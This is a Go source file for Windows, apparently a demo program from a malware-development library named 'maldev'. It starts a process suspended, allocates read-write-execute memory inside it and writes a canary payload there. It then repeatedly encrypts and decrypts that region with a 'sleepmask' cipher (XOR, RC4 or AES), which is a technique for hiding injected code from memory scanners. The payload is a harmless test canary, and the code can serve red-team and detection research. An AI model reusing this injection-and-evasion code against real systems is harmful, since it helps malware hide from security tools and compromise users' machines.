//go:build windows

package main

import (
	"context"
	"fmt"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/sleepmask"
	"github.com/oioio-space/maldev/testutil"
)

func runHost(cfg demoConfig) error {
	cmdLine, err := windows.UTF16PtrFromString(cfg.HostBinary)
	if err != nil {
		return fmt.Errorf("utf16: %w", err)
	}
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	if err := windows.CreateProcess(nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED, nil, nil, &si, &pi); err != nil {
		return fmt.Errorf("CreateProcess: %w", err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.TerminateProcess(pi.Process, 0)
	defer windows.CloseHandle(pi.Process)

	logf(cfg, "spawned %s pid=%d", cfg.HostBinary, pi.ProcessId)

	payload := testutil.WindowsSearchableCanary
	remoteAddr, _, _ := windows.NewLazySystemDLL("kernel32.dll").
		NewProc("VirtualAllocEx").Call(
		uintptr(pi.Process), 0, uintptr(len(payload)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	if remoteAddr == 0 {
		return fmt.Errorf("VirtualAllocEx remote")
	}
	var n uintptr
	if err := windows.WriteProcessMemory(pi.Process, remoteAddr, &payload[0], uintptr(len(payload)), &n); err != nil {
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	logf(cfg, "wrote canary at remote 0x%X (pid %d)", remoteAddr, pi.ProcessId)

	var cipher sleepmask.Cipher
	switch cfg.CipherName {
	case "xor":
		cipher = sleepmask.NewXORCipher()
	case "rc4":
		cipher = sleepmask.NewRC4Cipher()
	case "aes":
		cipher = sleepmask.NewAESCTRCipher()
	default:
		return fmt.Errorf("unknown cipher %q", cfg.CipherName)
	}

	mask := sleepmask.NewRemote(sleepmask.RemoteRegion{
		Handle: uintptr(pi.Process), Addr: remoteAddr, Size: uintptr(len(payload)),
	}).WithCipher(cipher)

	for cycle := 1; cycle <= cfg.Cycles; cycle++ {
		logf(cfg, "cycle %d/%d begin (remote)", cycle, cfg.Cycles)
		ctx, cancel := context.WithTimeout(context.Background(), cfg.Sleep+5*time.Second)
		if err := mask.Sleep(ctx, cfg.Sleep); err != nil {
			cancel()
			return fmt.Errorf("cycle %d: %w", cycle, err)
		}
		cancel()
		logf(cfg, "cycle %d/%d end", cycle, cfg.Cycles)
	}
	return nil
}
